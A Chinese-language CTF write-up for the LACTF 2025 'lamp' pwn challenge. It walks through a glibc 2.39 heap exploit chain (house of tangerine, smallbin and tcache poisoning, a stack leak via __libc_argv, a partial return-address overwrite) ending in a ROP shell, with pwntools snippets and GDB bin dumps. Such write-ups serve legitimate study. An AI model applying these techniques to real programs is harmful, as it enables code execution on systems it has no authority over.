# lamp

我觉得是时候该接受我这辈子都学不会ctf的事实了，从pwn开始

参考wp： https://jonathankeller.net/ctf/lamp

题目设置：
- 可以分配任意个大小在0-0xff之间的chunk
- 每个chunk在分配到手后有任意大小的overflow，但这也是唯一一次可以（直接）往该chunk里写东西的机会
- 无free
- 无文件流（file streams），于是不能用fsop
- libc 2.39

第一步肯定是用喜闻乐见的house of tangerine free掉top chunk，从而利用bins的结构来实现一些攻击。wp提供了稳定实施house of tangerine的函数。偷了，下一步

第二步是尝试使分配器返回堆地址，因为2.39里栈上的rop算是最直接的rce方式。smallbins其实是个环形的双向链表结构，而头指针（head pointer）在libc里。意味着启用smallbin后，堆上会有一个指向libc的指针；加上有溢出的漏洞，可以做个partial overwrite，使那个libc指针指向`__libc_argv`（内含栈地址）。再修改一个smallbin使其指向包含libc指针的smallbin，最后分配时就能连着把栈地址也拿出来了

不过堆分配器拿smallbin时不是一个一个拿的，而是当tcache耗尽后，一次性拿出足够填满tcache的堆块。于是要注意smallbins的数量要正好，正好卡在tcache准备拿到损坏的chunk之前。这样还不够，想要这么做需要确保argv和environ里有正确的设置，因为smallbins会在不同的地方检查指针。这题正好提供了一个run文件来保证配置正确

好了欢迎来到噩梦堆风水。光看wp根本看不懂，以下是一些补充
```py
#每个pause处对应下方的一个layout
    print("fake", hex(fake_bins))
    print("target", hex(target_bin))
    print("start", hex(start_bin))

    gdb.attach(p)
    pause()
    p.send(b"58")
    BINS = 0
    for i in range(BINS):
        # This ended up being unused, it was here to help control the length
        # of the list of smallbins leading to the bin we wanted to overwrite
        p.send(p64(fake_bins + (i+1)*0x20)) # dummy
        p.send(p64(fake_bins + (i+1)*0x20)) # dummy
        p.send(p64(fake_bins + (i+1)*0x20)) # fd
        p.send(p64(fake_bins + (i+1)*0x20)) # bk

    p.send(p64(target_bin))
    p.send(p64(target_bin))
    p.send(p64(target_bin))
    p.send(p64(target_bin))
    p.send(b"X" * (target_bin - fake_bins - BINS*0x20 - 0x18))
    p.send(b"\x00" * 16)
    p.send(b"\xc8\x46\n")
    pause()
    p.send(b"30")
    p.send(b"Y" * (start_bin - start_overwrite_from))
    p.send(p64(target_bin))
    p.send(p64(target_bin))
    p.send(p64(target_bin))
    p.send(p64(target_bin))
    p.send(b"\n")
    pause()
    # Pop the tcache entries.
    for i in range(7):
        p.send(b"58\n")

    # Pop a smallbin entry, causing malloc to move entries from the smallbin to the tcache
    p.send(b"58\n")
    pause()
```
```
fake 0x5c8150256f90
target 0x5c8150278f78
start 0x5c8150366f90
```
这三个值还挺重要的
```sh
#第二步开始前的布局
tcachebins
0x20 [  1]: 0x5c815018b2a0 ◂— 0
0x40 [  3]: 0x5c8150344fb0 —▸ 0x5c8150322fb0 —▸ 0x5c8150300fb0 ◂— 0
0x60 [  7]: 0x5c8150256f90 —▸ 0x5c8150234f90 —▸ 0x5c8150212f90 —▸ 0x5c81501f0f90 —▸ 0x5c81501cef90 —▸ 0x5c81501acf90 —▸ 0x5c815018bf90 ◂— 0
fastbins
0x60: 0x5c81503aaf80 ◂— 0
unsortedbin
empty
smallbins
0x60: 0x5c8150388f80 —▸ 0x5c8150366f80 —▸ 0x5c81502def80 —▸ 0x5c81502bcf80 —▸ 0x5c815029af80 —▸ 0x5c8150278f80 —▸ 0x7bdd81c03b70 ◂— 0x5c8150388f80
```
请记住这一切正常的样子（
```sh
#X溢出后的布局
tcachebins
0x20 [  1]: 0x5c815018b2a0 ◂— 0
0x40 [  3]: 0x5c8150344fb0 —▸ 0x5c8150322fb0 —▸ 0x5c8150300fb0 ◂— 0
0x60 [  6]: 0x5c8150234f90 —▸ 0x5c8150212f90 —▸ 0x5c81501f0f90 —▸ 0x5c81501cef90 —▸ 0x5c81501acf90 —▸ 0x5c815018bf90 ◂— 0
fastbins
0x60: 0x5c81503aaf80 ◂— 0
unsortedbin
empty
smallbins
0x60 [corrupted]
FD: 0x5c8150388f80 —▸ 0x5c8150366f80 —▸ 0x5c81502def80 —▸ 0x5c81502bcf80 —▸ 0x5c815029af80
 —▸ 0x5c8150278f80 —▸ 0x7bdd81c046c8 ◂— 0
BK: 0x5c8150278f80 —▸ 0x5c815029af80 —▸ 0x5c81502bcf80 —▸ 0x5c81502def80 —▸ 0x5c8150366f80
 ◂— ...
```
这一步还好理解，作用是修改原本的libc指针，使其指向`__libc_argv`
```sh
#Y溢出后的布局
tcachebins
0x20 [  1]: 0x5c815018b2a0 ◂— 0
0x40 [  2]: 0x5c8150322fb0 —▸ 0x5c8150300fb0 ◂— 0
0x60 [  6]: 0x5c8150234f90 —▸ 0x5c8150212f90 —▸ 0x5c81501f0f90 —▸ 0x5c81501cef90 —▸ 0x5c81501acf90 —▸ 0x5c815018bf90 ◂— 0
fastbins
0x60: 0x5c81503aaf80 ◂— 0
unsortedbin
empty
smallbins
0x60 [corrupted]
FD: 0x5c8150388f80 —▸ 0x5c8150366f80 —▸ 0x5c8150278f78 ◂— 0
BK: 0x5c8150278f80 —▸ 0x5c815029af80 —▸ 0x5c81502bcf80 —▸ 0x5c81502def80 —▸ 0x5c8150366f80
 ◂— ...
```
从这一步开始要留个心眼了。smallbin和tcache管理堆块的方式不同。smallbin中的堆块地址指向堆块的header部分；而tcache则是指向数据（fd）。所以如果想要修改`0x5c8150366f80`的fd，得溢出到`0x5c8150366f90`。这里我们将chunk start（`0x5c8150366f90`）的fd覆盖成了chunk target（`0x5c8150278f78`）。`0x5c8150278f78`其实就是原本fd包含libc地址的chunk地址（位于`0x5c8150278f80`）减8，原因在于后续从smallbin拿chunk填充tcache时走的是bk链，所以我们需要使libc地址位于bk处，而不是原本的fd
```sh
#清空tcache后的布局
tcachebins
0x20 [  1]: 0x5c815018b2a0 ◂— 0
0x40 [  2]: 0x5c8150322fb0 —▸ 0x5c8150300fb0 ◂— 0
0x60 [  7]: 0x7fffad926878 —▸ 0x7bdd81c046d8 —▸ 0x5c8150278f88 —▸ 0x5c8150366f90 —▸ 0x5c81502def90 —▸ 0x5c81502bcf90 —▸ 0x5c815029af90 ◂— 0
fastbins
empty
unsortedbin
empty
smallbins
0x60 [corrupted]
FD: 0x5c8150388f80 —▸ 0x5c8150366f80 ◂— 0x5c849838ecf6
BK: 0x7fffad926fd1 ◂— 0x706d616c2f2e11
```
smallbins进tcache的顺序是倒着来的。不过我不确定为什么从`0x5c815029af80`开始。末尾的`0x5c8150278f80`倒着走一直走到`0x5c8150366f80`，下一个是`0x5c8150278f88`。由于错位，bk处正好是libc地址；再下一个正好是栈地址。此时正正好好7个填满tcache，程序不会崩溃

目前tcache里有了个栈地址。可是我们不知道任何地址，写也不知道写什么；而且只有一个地址，想要leak再写也至少要两个地址；再者，目前的地址指向程序的参数和环境变量，离栈底部非常远

第二个问题还是很好解决的。tcache+溢出，明显的tcache poisoning。可以将`tcache[40]->next`覆盖成tcache_entry(tcache_perthread_struct)；此时`malloc(0x38)`就能覆盖tcache结构。用一次溢出将tcache结构修改成如下样子：
- 将管理counts的地方覆盖成大数字从而欺骗堆管理器使其认为tcache不会耗尽
- 将`tcache[0x20]`和`tcache[0x40]`里的指针覆盖成`tcache[0x80]`（跳过奇数元素，保证malloc不会破坏关键内容。wp没有说为什么会破坏，个人猜测是因为奇数大小堆块管理时会稍微错位某些地方）
- 对`tcache[0x60]`指向的栈地址进行partial overwrite，期望覆盖后能够指向栈上更高的地址

此时malloc `tcache[0x40]`就能从`tcache[0x80]`处开始继续修改tcache entry。接着将`tcache[0x80]`指向`tcache[0x60]`，同时将后续的`tcache[0xa0]`,`tcache[0xc0]`到`tcache[0x100]`都覆盖成`tcache[0x80]`。然后malloc `tcache[0x80]`会得到`tcache[0x60]`，同时`tcache[0x80]`将指向`tcache[0x60]`指向的内容，即那个栈地址。不过这个栈地址是加密的，需要连续调用两次加密函数才能得到原本的栈地址。之前覆盖的一堆指向`tcache[0x80]`的bins就派上用场了，全部malloc一遍就能得到原本的栈地址了

假设前面的partial overwrite成功了，我们手中的栈地址确实指向了某块活跃的栈部分。目前的问题是仍然没有任何泄漏的地址。这就不得不品大佬的天才做法了。查看题目使用的`gets`函数的[实现](https://github.com/uclaacm/lactf-archive/blob/main/2025/pwn/lamp/lamp.c)，不断调用read，一次只读一个字节，直到接收到`\n`。于是可以不断往这个栈地址里写`\x1f`，总有一天会碰到read调用后的返回地址。原本read调用后的返回地址位于binary的`0x114d`处，我们改成`0x111f`后，返回地址就成了main开头调用`write`的地方。此处会把rbx里的地址打印出来，正好rbx内含代码段地址。成功同时得知了binary的代码段地址和手中的栈地址相对于read的返回地址的偏移

现在就可以用堆上的两个栈指针来编写rop链了。第一个栈地址用于编写read返回地址后的rop链，同时保证不修改read的返回地址（因为一次只读一个byte，不能在后续rop链完成前就返回到rop链）；第二个栈地址用于修改read的返回地址

但是又有问题了。实操中read返回地址后是存储用户输入的malloc大小的地方，会损坏我们设计的rop链。不过还有办法。任何指针的前两个字节都是0，加上以小端存储；假如我们输入的大小只有一个字节，便只会覆盖掉rop链顶部的一个字节。那我们让这个大小等同于原rop链顶部的字节不就好了？这个方法只需要保证`tcache[0x20]` bin里有合法的栈地址

现在只需用上述提到的方法写一个泄漏libc地址的rop链，再拿泄漏的地址构造getshell的rop链即可

题目作者官方的省流版本： https://enzo.run/posts/lactf2025